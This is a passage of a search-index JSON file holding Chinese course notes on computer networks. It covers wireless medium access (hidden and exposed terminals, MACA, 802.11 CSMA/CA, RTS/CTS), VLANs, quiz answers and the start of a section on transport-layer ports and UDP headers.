<li>\u5176\u4f20\u8f93\u7684\u8303\u56f4\u6709\u9650\uff0c\u4e00\u4e2a\u7ad9\u53d1\u51fa\u7684\u4fe1\u53f7\u53ef\u80fd\u4e0d\u80fd\u5230\u8fbe\u5176\u4ed6\u6240\u6709\u7ad9</li> </ul> <p>\u56e0\u4e3a\u4e0a\u8ff0\u7279\u6b8a\u6027\uff0c\u4f1a\u5f15\u53d1\u4e00\u4e9b\u95ee\u9898</p> <ul> <li>\u9690\u85cf\u7ec8\u7aef\u95ee\u9898\uff08hidden terminal problem\uff09 C\u5411B\u53d1\u6d88\u606f\uff0c\u6b64\u65f6A\u5411B\u53d1\u6d88\u606f\uff0c\u4f46\u662fC\u65e0\u6cd5\u68c0\u6d4b\u5230A\u5411B\u53d1\u6d88\u606f\u8fd9\u4e2a\u4e8b\u5b9e\uff0c\u56e0\u4e3aC\u5728A\u65e0\u7ebf\u4f20\u64ad\u8ddd\u79bb\u4e4b\u5916\uff0c\u6b64\u65f6\u9020\u6210\u51b2\u7a81\uff0c\u53cc\u65b9\u53d1\u9001\u5931\u8d25\uff0c\u4e5f\u5c31\u662f\u8bf4\u4fa6\u542c\u65e0\u4fe1\u606f\u786e\u5b9a\u4e0d\u51b2\u7a81\u662f\u6ca1\u6709\u610f\u4e49\u7684</li> </ul> <p>\u200b\u200b</p> <ul> <li>\u66b4\u9732\u7ec8\u7aef\u95ee\u9898\uff08exposed terminal problem\uff09 B\u6b63\u5728\u7ed9A\u53d1\u6d88\u606f\uff0c\u6b64\u65f6C\u60f3\u8981\u7ed9D\u53d1\u6d88\u606f\uff0c\u4f46\u662f\u76d1\u542c\u5230\u4e86B\u7684\u6d88\u606f\uff0c\u8ba4\u4e3a\u6b64\u65f6\u5e94\u8be5\u7b49\u5f85\uff0c\u5b9e\u9645\u4e0a\u6b64\u65f6C\u7ed9D\u7684\u6d88\u606f\u5e76\u4e0d\u53d7B\u7ed9A\u7684\u6d88\u606f\u5f71\u54cd\uff0c\u4e5f\u5c31\u662f\u8bf4\u4fa6\u542c\u6709\u4fe1\u606f\u786e\u5b9a\u51b2\u7a81\u4e5f\u662f\u6ca1\u6709\u610f\u4e49\u7684</li> </ul> <p>\u200b\u200b</p> <p>\u5f15\u53d1\u4e0a\u8ff0\u95ee\u9898\u7684\u6839\u672c\u539f\u56e0\u5728\u4e8e\uff0c\u53d1\u9001\u7aef\u53ea\u80fd\u611f\u77e5\u5230\u53d1\u9001\u7aef\u662f\u5426\u6709\u5176\u4ed6\u65e0\u7ebf\u4fe1\u53f7\uff0c\u4f46\u5f71\u54cd\u63a5\u53d7\u7ed3\u679c\u7684\u4e8b\u63a5\u6536\u7aef\u9644\u8fd1\u7684\u65e0\u7ebf\u4fe1\u53f7\u3002</p> <p>\u5728\u6709\u7ebf\u901a\u4fe1\u4e2d\uff0c\u4e0d\u5b58\u5728\u4f20\u64ad\u8303\u56f4\u8fd9\u4e2a\u9650\u5236\uff0c\u4e0a\u8ff0\u6982\u5ff5\u662f\u7b49\u540c\u7684\uff0c\u5f71\u54cd\u4e86\u53d1\u9001\u7aef\u7684\u80af\u5b9a\u4e5f\u5f71\u54cd\u4e86\u63a5\u6536\u7aef\uff1b\u4f46\u5728\u65e0\u7ebf\u901a\u4fe1\u4e2d\u53ea\u8981\u63a5\u6536\u65b9\u4e92\u4e0d\u5e72\u6270\uff0c\u591a\u4e2a\u4f20\u8f93\u53ef\u4ee5\u540c\u65f6\u53d1\u751f\uff0c\u6211\u4eec\u4e5f\u5e94\u5f53\u5229\u7528\u8fd9\u79cd\u5e76\u53d1\u6027</p>"},{"location":"ZJU-course/%E8%AE%A1%E7%BD%91/%E4%BB%8B%E8%B4%A8%E8%AE%BF%E9%97%AE%E5%AD%90%E5%B1%82/#31-maca","title":"3.1 \u51b2\u7a81\u907f\u514d\u591a\u8def\u8bbf\u95ee MACA","text":"<p>MACA Multiple Access with Collision Avoidance</p> <p>\u5177\u4f53\u7684\u505a\u6cd5\u662f\uff1aA\u8981\u7ed9B\u53d1\u9001\u6570\u636e\u4e4b\u524d\uff0c\u5148\u53d1\u9001\u4e00\u4e2aRTS\uff08Request to Send\uff09\uff0c\u91cc\u9762\u5305\u542b\u76ee\u6807B\u548c\u60f3\u8981\u53d1\u9001\u7684\u6570\u636e\u5e27\u957f\u5ea6\uff1bB\u5728\u53d7\u5230\u8fd9\u4e2aRTS\u4e4b\u540e\uff0c\u56de\u590d\u4e00\u4e2aCTS\uff08Clear to Send\uff09\u5176\u4e2d\u4e5f\u5305\u542b\u4eceRTS\u4e2d\u83b7\u53d6\u7684\u957f\u5ea6\uff0cA\u5728\u63a5\u6536\u5230CTS\u540e\u5f00\u59cb\u4f20\u8f93</p> <p>\u8fd9\u4e2a\u505a\u6cd5\u7684\u76ee\u6807\u662f</p> <ul> <li>A\u7684\u53d1\u9001\u8303\u56f4\u91cc\u7684\u7ad9\u6536\u5230RTS\u4f1a\u6c89\u9ed8\uff0c\u907f\u514d\u4e0eA\u6536\u5230\u7684CTS\u51b2\u7a81\uff0c\u76f4\u5230A\u5f00\u59cb\u53d1\u9001\u6d88\u606f</li> <li>B\u7684\u53d1\u9001\u8303\u56f4\u91cc\u7684\u7ad9\u6536\u5230CTS\u4f1a\u6c89\u9ed8\uff0c\u907f\u514d\u4e0eB\u6536\u5230\u7684\u4fe1\u606f\u51b2\u7a81\uff0c\u9759\u9ed8\u65f6\u95f4\u901a\u8fc7CTS\u4e2d\u5b58\u50a8\u7684\u4fe1\u606f\u957f\u5ea6\u5224\u65ad</li> </ul> <p>CTS\u548cRTS\u4e2d\u5b58\u50a8\u957f\u5ea6\u7684\u539f\u56e0\u5728\u4e8e\uff0c\u8ba9\u9759\u9ed8\u7684\u7ad9\u77e5\u9053\u8be5\u9759\u9ed8\u591a\u5c11\u65f6\u95f4</p> <p>MACA\u540c\u65f6\u80fd\u89e3\u51b3\u66b4\u9732\u7ec8\u7aef\u548c\u9690\u85cf\u7ec8\u7aef\u95ee\u9898</p>"},{"location":"ZJU-course/%E8%AE%A1%E7%BD%91/%E4%BB%8B%E8%B4%A8%E8%AE%BF%E9%97%AE%E5%AD%90%E5%B1%82/#32-ieee-80211","title":"3.2 IEEE 802.11","text":"<p>\u8fd9\u662f\u4e00\u4e2a\u5b8c\u6574\u7684\u534f\u8bae\u67b6\u6784</p>"},{"location":"ZJU-course/%E8%AE%A1%E7%BD%91/%E4%BB%8B%E8%B4%A8%E8%AE%BF%E9%97%AE%E5%AD%90%E5%B1%82/#321","title":"3.2.1 \u7269\u7406\u5c42","text":"<p>\u200b\u200b</p> <p>IEEE802.11\u7684\u7269\u7406\u5c42\u6709\u4e24\u79cd\u5f62\u5f0f\uff0c\u4e00\u79cd\u662fInfrastructure mode\uff0c\u4e00\u79cd\u662fAd-hoc mode</p> <p>\u4e5f\u5c31\u662f\u8bf4\u4e00\u79cd\u662f\u4f9d\u8d56Access point\u53bb\u8fde\u63a5\uff0c\u53e6\u4e00\u79cd\u662f\u4e00\u4e9b\u7ec8\u7aef\u76f4\u63a5\u70b9\u5bf9\u70b9\u8fde\u63a5</p> <p>\u534f\u8bae\u6808</p> <p>\u200b\u200b</p> <p>\u901a\u8fc7\u534f\u8bae\u6808\u6211\u4eec\u770b\u51fa\uff0c\u5728\u6280\u672f\u53d1\u5c55\u8fc7\u7a0b\u4e2d\uff0cIEEE802.11\u7684\u7269\u7406\u5c42\u4f7f\u7528\u4e86\u4e0d\u540c\u7684\u6280\u672f</p> <p>\u4f7f\u7528\u7684\u9891\u5e26</p> <p>\u200b\u200b</p> <p>IEEE802.11\u4f7f\u7528\u7684\u662fISM band\uff0c\u5176\u5b9e\u975e\u5e38\u5608\u6742\uff0c\u65e0\u9700\u8bb8\u53ef\u5927\u5bb6\u90fd\u80fd\u7528</p> <p>\u901f\u7387\u81ea\u9002\u5e94 rate adaptive</p> <p>\u901a\u8fc7\u4e22\u5305\u7387\u8c03\u6574\u53d1\u9001\u901f\u7387\uff0c\u5f53\u4e22\u5305\u7387\u4f4e\u7684\u65f6\u5019\uff0c\u8c03\u9ad8\u901f\u7387\uff1b\u4e22\u5305\u7387\u9ad8\u7684\u65f6\u5019\uff0c\u8c03\u4f4e\u901f\u7387</p>"},{"location":"ZJU-course/%E8%AE%A1%E7%BD%91/%E4%BB%8B%E8%B4%A8%E8%AE%BF%E9%97%AE%E5%AD%90%E5%B1%82/#322-mac-sublayer","title":"3.2.2 MAC Sublayer","text":"<p>CSMA/CA</p> <p>\u65e0\u7ebf\u7535\u603b\u662f\u534a\u53cc\u5de5\u7684\uff0c\u505a\u4e0d\u5230\u9519\u8bef\u68c0\u6d4b\uff0c802.11\u91c7\u7528CSMA/CA\uff08CSMA with Collision Avoidance\uff09\u6765\u907f\u514d\u51b2\u7a81</p> <p>\u5176\u53d1\u9001\u7684\u6d41\u7a0b\u662f\uff1a</p> <ul> <li>\u7b49\u4e00\u6bb5\u6ca1\u6709\u4eba\u53d1\u9001\u6d88\u606f\u7684\u65f6\u95f4\uff0c\u5b8c\u6210\u786e\u8ba4</li> <li>\u7b49\u5f85\u5b8c\u4e4b\u540e\u968f\u673a\u518d\u7b49\u5f85\u4e00\u4e2a\u65f6\u95f4\u6bb5\uff08\u5728\u8fd9\u4e2a\u65f6\u95f4\u6bb5\u4e2d\u4e5f\u8981\u4fa6\u542c\uff0c\u82e5\u662f\u6709\u4fe1\u606f\u6765\u51b2\u7a81\uff0c\u5219\u9000\u51fa\u8fd9\u4e2a\u6d41\u7a0b\uff09</li> <li>\u53d1\u9001\u4fe1\u606f</li> </ul> <p>\u4e0a\u9762\u7684\u7b2c\u4e8c\u6b65\u662f\u4e0e\u4ee5\u592a\u7f51\u4e0d\u540c\u7684\u5730\u65b9\uff0c\u539f\u56e0\u5728\u4e8eWLAN\u7684\u51b2\u7a81\u66f4\u52a0\u6602\u8d35</p> <p>\u200b\u200b</p> <p>\u4e0a\u8ff0\u8fd9\u79cd\u64cd\u4f5c\u65b9\u6cd5\u88ab\u79f0\u4e3aDCF Distributed Coordination Function\u56e0\u4e3a\u6211\u4eec\u4e0d\u4f9d\u8d56\u4e00\u4e2a\u4e2d\u592e\u63a7\u5236\u7cfb\u7edf\u53bb\u534f\u8c03\uff0c\u800c\u662f\u5927\u5bb6\u5404\u81ea\u4fa6\u542c\uff0c\u5404\u81ea\u786e\u8ba4\u3002</p> <p>\u8fd8\u6709\u4e00\u79cdPCF Point Coordination Function\uff0c\u5c31\u662f\u4f9d\u8d56\u7269\u7406\u5c42\u4e2d\u7684Access Point\uff0c\u53bb\u505a\u68c0\u6d4b\u548c\u786e\u8ba4\uff0c\u4f46\u662f\u8fd9\u79cd\u505a\u6cd5\u4e00\u822c\u8f83\u5dee\uff0c\u53ea\u80fd\u4fdd\u8bc1\u4e00\u4e2aAccess Point\u4e0b\u7684\u8bbe\u5907\u4e0d\u51b2\u7a81\uff0c\u4e0d\u4fdd\u8bc1\u4e0d\u540cAccess Point\u4e0b\u7684\u8bbe\u5907\u4e0d\u51b2\u7a81</p> <p>Virtual channel sensing</p> <p>CSMA/CA \u662f\u6ca1\u6709\u89e3\u51b3\u66b4\u9732\u7ec8\u7aef\u95ee\u9898\u548c\u9690\u85cf\u7ec8\u7aef\u95ee\u9898\u7684\uff0c\u56e0\u6b64\u6211\u4eec\u5f15\u5165\u4e00\u4e2a\u65b0\u7684\u673a\u5236</p> <p>\u4f7f\u7528RTS\u548cCTS\u673a\u5236\u6765\u5b9e\u73b0\uff0cNAV\uff08Network Allocation Vector\uff09\u5c31\u662fRTS\u548cCTS\u4e2d\u5305\u542b\u7684\u90a3\u4e2a\u6240\u8c13\u7684\u957f\u5ea6\u3002\u76f8\u5f53\u4e8e\u662f\u9884\u544a\u4e86\u6211\u63a5\u4e0b\u6765\u4f1a\u53d1\u591a\u5c11\u65f6\u95f4\u7684\u6570\u636e\uff0c\u5176\u4ed6\u7ad9\u9700\u8981\u7b49\u5f85\u591a\u4e45</p> <p>\u200b\u200b</p> <ul> <li>C\u8981\u7b49\u5f85\u5230ACK\u53d1\u5b8c\uff0c\u800cD\u5176\u5b9e\u53ea\u9700\u8981\u7b49\u5f85\u5230Data\u53d1\u5b8c\u5c31\u53ef\u4ee5\u4e86</li> </ul> <p>\u4f46\u5728\u5b9e\u9645\u4e0a\u800c\u8a00\uff0c\u4e0a\u8ff0\u7684RTS\u548cCTS\u673a\u5236\u662f\u5728\u5b9e\u8df5\u4e2d\u610f\u4e49\u4e0d\u5927\u7684</p> <ul> <li>\u5176\u5bf9\u77ed\u5e27\u548c\u63a5\u5165\u70b9\uff08AP\uff09\u6ca1\u6709\u5e2e\u52a9</li> <li>\u4e0d\u80fd\u50cfMACA\u4e00\u6837\u540c\u65f6\u89e3\u51b3\u4e24\u4e2a\u95ee\u9898\uff0c\u5176\u5b9e\u53ea\u89e3\u51b3\u4e86\u9690\u85cf\u7ec8\u7aef\u95ee\u9898</li> </ul> <p>\u901a\u5e38\u60c5\u51b5\u4e0b\uff0c\u9690\u85cf\u7ec8\u7aef\u95ee\u9898\u51fa\u73b0\u5f97\u4e0d\u591a</p> <p>\u4e00\u4e9b\u5176\u4ed6\u673a\u5236</p> <ul> <li> <p>Reliability\uff1a\u65e0\u7ebf\u7f51\u7edc\u73af\u5883\u5608\u6742\uff0c\u9700\u8981\u589e\u52a0\u4f20\u8f93\u6210\u529f\u7684\u6982\u7387</p> </li> <li> <p>lower the tranmission rate \u964d\u4f4e\u4f20\u8f93\u901f\u7387\uff0c\u6211\u4eec\u53ef\u4ee5\u8c03\u5236\u5f97\u66f4\u597d</p> </li> <li> <p>send shorter frame \u5982\u679c\u6bcf\u4e2abit\u7684\u51fa\u9519\u7387\u4e00\u81f4\uff0c\u90a3\u4e48\u8d8a\u77ed\u5219\u65e0\u9519\u7684\u6982\u7387\u8d8a\u5927\uff0c\u6709\u4e24\u79cd\u505a\u6cd5</p> <ul> <li>reducing the maximum size of message</li> <li>802.11 allows the frames to be split into smaller pieces, called fragments, each with its own checksum. fragment\u7684\u957f\u5ea6\u662f\u53ef\u4ee5\u52a8\u6001\u53d8\u5316\u7684</li> <li>Savinng Power\uff1a\u79fb\u52a8\u65e0\u7ebf\u8bbe\u5907\u9700\u8981\u8003\u8651\u7535\u6c60\u7684\u5bff\u547d\uff0c\u56e0\u4e3a\u65e0\u7ebf\u901a\u4fe1\u8981\u8017\u7535\u7684</li> </ul> </li> <li> <p>Beacon Frames \u8fd9\u4e2a\u5e27\u662fAP\u5b9a\u671f\u5e7f\u64ad\u7684\u5e27\uff08100ms\u4e00\u6b21\uff09\u544a\u77e5\u5ba2\u6237\u7aefAP\u7684\u5b58\u5728\uff0c\u5e76\u4e14\u643a\u5e26\u7cfb\u7edf\u53c2\u6570\u3002\u5ba2\u6237\u7aef\u53ef\u4ee5\u7ed9AP\u53d1\u9001\u5e27\u4e2d\u8bbe\u7f6e\u4e00\u4e2a\u7535\u6e90\u7ba1\u7406\u4f4d\uff0c\u544a\u77e5AP\u5176\u8fdb\u5165\u7701\u7535\u6a21\u5f0f\uff0c\u5ba2\u6237\u7aef\u53ef\u4ee5\u8fdb\u5165\u4f11\u7720\u72b6\u6001\uff0c\u800cAP\u4f1abuffer\u53d1\u5f80\u8be5\u5ba2\u6237\u7aef\u7684\u6d41\u91cf\u3002\u5f53Beacon Frames\u5230\u6765\u65f6\uff0c\u5ba2\u6237\u7aef\u4f1a\u88ab\u5524\u9192\uff0c\u5e76\u68c0\u67e5AP\u4e2d\u662f\u5426buffer\u4e86\u6211\u7684\u6570\u636e\uff08Beacon Frame \u4e2d\u6709\u4e00\u4e2a\u6d41\u91cf\u6620\u5c04\u56fe traffic map\uff09\u5982\u679c\u6709\uff0c\u5219\u5f00\u59cb\u8f6e\u8be2\u63a5\u53d7\u7f13\u5b58\u7684\u6d41\u91cf</p> </li> <li>APSD Automatic Power Save Delivery\uff08\u81ea\u52a8\u7701\u70b9\u4f20\u9012\uff09\u3002\u4e5f\u662fAP\u4f1a\u7f13\u51b2\u5e27\uff0c\u800c\u5728\u5ba2\u6237\u7aef\u7ed9AP\u53d1\u9001\u5e27\u4e4b\u540e\uff0cAP\u7acb\u5373\u5c06\u8fd9\u4e9b\u5e27\u53d1\u7ed9\u5ba2\u6237\u7aef\uff08\u5728\u5ba2\u6237\u7aef\u6709\u4e3b\u52a8\u9700\u6c42\u7684\u65f6\u5019\u83b7\u53d6buffer\uff09\u3002\u5ba2\u6237\u7aef\u53ef\u4ee5\u518d\u53d1\u9001\u5b8c\u6d41\u91cf\u4e4b\u540e\u8fdb\u5165\u4f11\u7720\u72b6\u6001</li> <li> <p>Quality of Service</p> </li> <li> <p>TODO</p> </li> </ul> <p>Frame Structure</p> <p>\u200b\u200b</p> <p>\u4e0a\u56fe\u662f 802.11 \u4e2d\u7684data frame\uff0c\u9664\u4e86\u6570\u636e\u5e27\u4ee5\u5916\u8fd8\u6709\u63a7\u5236\u5e27\u548c\u7ba1\u7406\u5e27</p> <p>\u200b\u200b</p>"},{"location":"ZJU-course/%E8%AE%A1%E7%BD%91/%E4%BB%8B%E8%B4%A8%E8%AE%BF%E9%97%AE%E5%AD%90%E5%B1%82/#4","title":"4. \u4e00\u4e9b\u5176\u4ed6\u7684\u77e5\u8bc6\u70b9 *","text":""},{"location":"ZJU-course/%E8%AE%A1%E7%BD%91/%E4%BB%8B%E8%B4%A8%E8%AE%BF%E9%97%AE%E5%AD%90%E5%B1%82/#41-vlan","title":"4.1 VLAN","text":"<p>\u865a\u62df\u5c40\u57df\u7f51VLAN\uff0c\u53ef\u4ee5\u628a\u4e00\u4e2a\u8f83\u5927\u7684\u5c40\u57df\u7f51\u5206\u5272\u6210\u4e00\u4e9b\u8f83\u5c0f\u7684\u4e0e\u4f4d\u7f6e\u65e0\u5173\u7684\u903b\u8f91\u4e0a\u7684VLAN</p> <p>\u6709\u4e09\u79cd\u5212\u5206LAN\u7684\u5f62\u5f0f</p> <ul> <li>\u57fa\u4e8e\u63a5\u53e3\uff0c\u5728\u6b64\u79cd\u60c5\u5f62\u4e0b\uff0c\u673a\u5668\u79bb\u5f00\u4e86\u539f\u6765\u7684\u63a5\u53e3\uff0c\u5c31\u53ef\u80fd\u8fdb\u5165\u4e00\u4e2a\u65b0\u7684\u5b50\u7f51</li> <li>\u57fa\u4e8eMAC\u5730\u5740\uff0c\u79fb\u52a8\u4e4b\u540e\u4e0d\u6539\u53d8\u5f52\u5c5e</li> <li>\u57fa\u4e8eIP\u5730\u5740\uff0c\u4f7f\u5f97VLAN\u53ef\u4ee5\u8de8\u8def\u7531\u5668\u6269\u5c55\uff0c\u628a\u591a\u4e2a\u5c40\u57df\u7f51\u7684\u4e3b\u673a\u8fde\u63a5\u8d77\u6765</li> </ul> <p>\u200b\u200b</p> <p>\u200b\u200b</p> <ul> <li>\u8fd9\u4e2a\u6d41\u7a0b\u6709\u70b9\u590d\u6742</li> </ul>"},{"location":"ZJU-course/%E8%AE%A1%E7%BD%91/%E4%BB%8B%E8%B4%A8%E8%AE%BF%E9%97%AE%E5%AD%90%E5%B1%82/#42","title":"4.2 \u5e7f\u64ad\u57df\uff0c\u51b2\u7a81\u57df","text":""},{"location":"ZJU-course/%E8%AE%A1%E7%BD%91/%E4%BB%8B%E8%B4%A8%E8%AE%BF%E9%97%AE%E5%AD%90%E5%B1%82/#_2","title":"\u5e38\u89c1\u9898\u578b","text":"<ul> <li>\u51e0\u79cdCSMA</li> <li>\u65e0\u51b2\u7a81\u534f\u8bae</li> <li>\u51b2\u7a81\u907f\u514d\u534f\u8bae</li> <li> <p>\u5c40\u57df\u7f51</p> </li> <li> <p>\u4ee5\u592a\u7f51\uff08\u6709\u7ebf\u5c40\u57df\u7f51\uff09</p> </li> <li>802.11 \uff08\u65e0\u7ebf\u5c40\u57df\u7f51\uff09</li> </ul> <p>\u200b\u200b</p> <p>\u200b\u200b</p> <ul> <li>\u5173\u4e8eMACA \u6536\u5230RTS \u4f46\u662f\u6ca1\u6536\u5230CTS\u5c31\u53ef\u4ee5\u53d1\uff0c\u4f46\u662f\u5982\u679c\u6536\u5230RTS\uff0c\u8fd8\u662f\u8981\u7b49\u4e00\u6bb5\u65f6\u95f4\u68c0\u67e5\u5176\u4f1a\u4e0d\u4f1a\u6536\u5230CTS</li> </ul> <p>\u200b\u200b</p> <p>\u200b\u200b</p> <ul> <li>\u8fd9\u9898\u76f4\u63a5\u8003\u5bdf\u7eafALOHA\u7684\u6548\u7387 10 * N = 56000  / 2e</li> </ul> <p>\u200b\u200b</p> <ul> <li>\u6982\u5ff5\u9898</li> </ul> <p>\u200b\u200b</p> <ul> <li>\u6982\u5ff5\u9898</li> </ul> <p>\u200b\u200b</p> <ul> <li>\u5173\u4e8e\u4ee5\u592a\u7f51\u8bbe\u5907</li> </ul> <p>\u200b\u200b</p> <p>\u200b\u200b</p> <p>\u200b\u200b</p> <p>\u200b\u200b</p> <ul> <li>VLAN\u8981\u53bb\u770b\u770b</li> </ul> <p>\u200b\u200b</p> <ul> <li>\u634e\u5e26\u786e\u8ba4</li> </ul> <p>\u200b\u200b</p> <p>\u200b\u200b</p> <p>\u200b\u200b</p> <ul> <li>\u5f531\u53d1\u9001\u7684\u65f6\u5019\uff0cSwitch\u8bb0\u5f55\u4e0b1\u7684\u7aef\u53e3\uff0c\u4f46\u6b64\u65f6\u4e0d\u77e5\u90533\u662f\u8c01\uff0c\u56e0\u6b64\u8981\u7fa4\u53d1\uff1b\u800c3\u53d1\u7ed91\u7684\u65f6\u5019\uff0c\u5df2\u7ecf\u77e5\u9053\u4e861\u662f\u8c01\uff0c\u6240\u4ee5\u53ea\u9700\u8981\u5355\u72ec\u53d1\u7ed91\u5373\u53ef</li> </ul> <p>\u200b\u200b</p> <ul> <li>\u8fd9\u4e2adelay\u8981\u8ba1\u7b97\u4e24\u6b21</li> </ul> <p>\u200b\u200b</p> <ul> <li>B</li> </ul> <p>\u200b\u200b</p> <ul> <li>B 5.12 * (2^2 - 1)</li> </ul> <p>\u200b\u200b</p> <ul> <li>B</li> </ul> <p>\u200b\u200b</p> <ul> <li>D \u9884\u7ea6\u4fe1\u9053\u5e76\u975e\u5f3a\u5236\u8981\u6c42 CSMA/CA \u53ef\u9009\u9879\u4e4b\u4e00</li> </ul> <p>DIFS &gt; PIFS &gt; SIFS</p> <p>\u200b\u200b</p> <ul> <li>A C token ring \u7684\u884c\u4e3a \u8981\u518d\u770b\u770b</li> </ul> <p>\u200b\u200b</p> <ul> <li>B</li> </ul> <p>\u200b\u200b</p> <ul> <li>B \u7ecf\u5178\u9898\u76ee</li> </ul> <p>\u200b\u200b</p> <ul> <li> <p>A \u4e00\u5f00\u59cb\u9000\u907f\u7684\u662fDIFS\uff0c\u540e\u9762\u7684\u90fd\u662fSIFS * CSMA/CA\u7684\u5177\u4f53\u6d41\u7a0b</p> </li> <li> <p>CSMA/CD \u662f\u534a\u53cc\u5de5\u7684</p> </li> <li>10Gbit\u4ee5\u592a\u7f51 \u53ea\u80fd\u5de5\u4f5c\u5728\u5168\u53cc\u5de5</li> <li>\u9ad8\u901f\u4ee5\u592a\u7f51\u548c\u4e00\u822c\u4ee5\u592a\u7f51\u7684MAC\u683c\u5f0f\u5b8c\u5168\u76f8\u540c</li> <li>\u94fe\u8def\u805a\u5408 \u4e0d\u662f VLAN\u7684\u4f18\u70b9</li> <li>802.11\u4e2d \u6709\u56db\u4e2a\u5730\u5740\u5b57\u6bb5 \u6839\u636e To AP From AP</li> <li>\u5e7f\u57df\u7f51\u548c\u5c40\u57df\u7f51\u7684\u533a\u522b\u5728\u4e8e\u4f7f\u7528\u534f\u8bae\u4e0d\u540c</li> <li>\u5e7f\u57df\u7f51\u4f7f\u7528\u7684\u4f20\u8f93\u5f62\u5f0f\u662f \u5b58\u50a8\u8f6c\u53d1</li> </ul> <p>\u200b\u200b</p> <ul> <li>B \u53ea\u9700\u8981\u68c0\u67e56B \u5730\u5740</li> </ul>"},{"location":"ZJU-course/%E8%AE%A1%E7%BD%91/%E4%BC%A0%E8%BE%93%E5%B1%82/","title":"\u4f20\u8f93\u5c42","text":""},{"location":"ZJU-course/%E8%AE%A1%E7%BD%91/%E4%BC%A0%E8%BE%93%E5%B1%82/#1","title":"1. \u4f20\u8f93\u5c42\u63d0\u4f9b\u7684\u670d\u52a1","text":"<ul> <li>\u94fe\u8def\u5c42\u63d0\u4f9b\u94fe\u8def\u4e0a\u8282\u70b9\u4e4b\u95f4\u7684\u903b\u8f91\u901a\u4fe1</li> <li>\u7f51\u7edc\u5c42\u63d0\u4f9b\u4e3b\u673a\u4e0a\u7684\u903b\u8f91\u901a\u4fe1</li> <li>\u4f20\u8f93\u5c42\u63d0\u4f9b\u4e0d\u540c\u4e3b\u673a\u4e0a\u7684\u8fdb\u7a0b\u4e4b\u95f4\u7684\u903b\u8f91\u901a\u4fe1</li> </ul> <p>\u4f20\u8f93\u5c42\u662f\u9762\u5411\u901a\u4fe1\u7684\u6700\u9ad8\u5c42\uff0c\u7528\u6237\u529f\u80fd\u7684\u6700\u5e95\u5c42\uff0c\u4f20\u8f93\u5c42\u53ea\u5b58\u5728\u4e8e\u4e3b\u673a\u4e0a\uff0c\u901a\u4fe1\u5b50\u7f51\u4e2d\u7684\u8def\u7531\u5668\u6ca1\u6709\u4f20\u8f93\u5c42</p> <ul> <li>\u4f20\u8f93\u5c42\u662f\u7aef\u5230\u7aef\u7684\uff0c\u5df2\u7ecf\u4e0d\u5c5e\u4e8e\u901a\u4fe1\u5b50\u7f51</li> </ul> <p>\u63d0\u4f9b\u670d\u52a1</p> <p>\u5305\u62ec\u5dee\u9519\u63a7\u5236\uff0c\u4f20\u8f93\u670d\u52a1\uff0c\u6d41\u91cf\u63a7\u5236</p> <ul> <li> <p>UDP \u5dee\u9519\u68c0\u6d4b\u4e4b\u540e\u76f4\u63a5\u4e22\u5f03 \u65e0\u8fde\u63a5\u7684\u670d\u52a1</p> </li> <li> <p>\u7528\u4e8eTFTP\uff0cDNS\uff0cSNMP\u548cRTP</p> </li> <li> <p>TCP \u5dee\u9519\u68c0\u6d4b\u4e4b\u540e\u91cd\u4f20 \u9762\u5411\u8fde\u63a5\u7684\u670d\u52a1</p> </li> <li> <p>\u4e0d\u63d0\u4f9b\u5e7f\u64ad\u548c\u591a\u64ad\u529f\u80fd</p> </li> <li>\u7528\u4e8eFTP\uff0cHTTP\uff0cTELNET\u7b49\u7b49</li> </ul> <p>\u200b\u200b</p>"},{"location":"ZJU-course/%E8%AE%A1%E7%BD%91/%E4%BC%A0%E8%BE%93%E5%B1%82/#11","title":"1.1 \u7aef\u53e3","text":"<p>\u5e94\u7528\u8fdb\u7a0b\u901a\u8fc7\u7aef\u53e3\u8fdb\u884c\u6807\u8bc6\uff0c\u7aef\u53e3\u53f7\u957f\u5ea6\u4e3a16 bit\uff0c\u670965536\u4e2a\u4e0d\u540c\u7aef\u53e3</p> <p>\u200b\u200b</p> <p>\u719f\u77e5\u7aef\u53e3\u53f7\u9700\u8981\u8bb0\u5fc6</p> <p>Socket</p> <p>Socket\u5c31\u662fIP\u5730\u5740+\u7aef\u53e3\u53f7\uff0c\u552f\u4e00\u6807\u8bc6\u4e00\u53f0\u4e3b\u673a\u4e0a\u7684\u4e00\u4e2a\u8fdb\u7a0b</p>"},{"location":"ZJU-course/%E8%AE%A1%E7%BD%91/%E4%BC%A0%E8%BE%93%E5%B1%82/#2-udp","title":"2. UDP","text":"<p>UDP\u4ec5\u5728IP\u7684\u670d\u52a1\u4e0a\u589e\u52a0\u4e86\u4e24\u4e2a\u57fa\u672c\u529f\u80fd\uff0c\u590d\u7528\u4e0e\u5206\u7528+\u5dee\u9519\u68c0\u6d4b</p> <p>UDP\u7684\u7279\u70b9\u5305\u62ec\u5f00\u9500\u5c0f\uff0c\u53ef\u591a\u64ad</p> <p>\u200b\u200b</p> <p>UDP\u5e38\u7528\u4e8e\u4e00\u6b21\u6027\u4f20\u8f93\u8f83\u5c11\u6570\u636e\u7684\u7f51\u7edc\u5e94\u7528\uff0c\u4ee5\u53ca\u591a\u5a92\u4f53\u5e94\u7528\uff08IP\u7535\u8bdd\uff0c\u89c6\u9891\u4f1a\u8bae\uff0c\u6d41\u5a92\u4f53\uff09</p> <p>UDP\u7684\u5177\u4f53\u884c\u4e3a</p> <p>\u200b\u200b</p>"},{"location":"ZJU-course/%E8%AE%A1%E7%BD%91/%E4%BC%A0%E8%BE%93%E5%B1%82/#21-udp","title":"2.1 UDP\u7684\u9996\u90e8\u683c\u5f0f","text":"<p>UDP\u7684\u9996\u90e8\u5305\u542b8B\uff0c\u91cc\u9762\u67094\u4e2a\u5b57\u6bb5\uff0c\u6bcf\u4e2a\u5b57\u6bb5\u90fd\u662f2B</p> <ul> <li>\u6e90\u7aef\u53e3\uff0c\u4e0d\u9700\u8981\u5bf9\u65b9\u56de\u4fe1\u65f6\u53ef\u4ee5\u9009\u62e9\u5168\u4e3a0</li> <li>\u76ee\u7684\u7aef\u53e3</li> <li>\u957f\u5ea6\uff0c\u9996\u90e8+\u6570\u636e\u7684\u957f\u5ea6\uff0c\u6700\u5c0f\u503c\u4e3a8B</li> <li>\u68c0\u9a8c\u548c\uff0c\u8fd9\u4e2a\u5b57\u6bb5\u4e5f\u53ef\u4ee5\u5168\u4e3a0\uff0c\u8ba4\u4e3a\u6211\u4eec\u4e0d\u9700\u8981\u68c0\u9a8c\u548c</li> </ul> <p>\u200b\u200b</p> <ul> 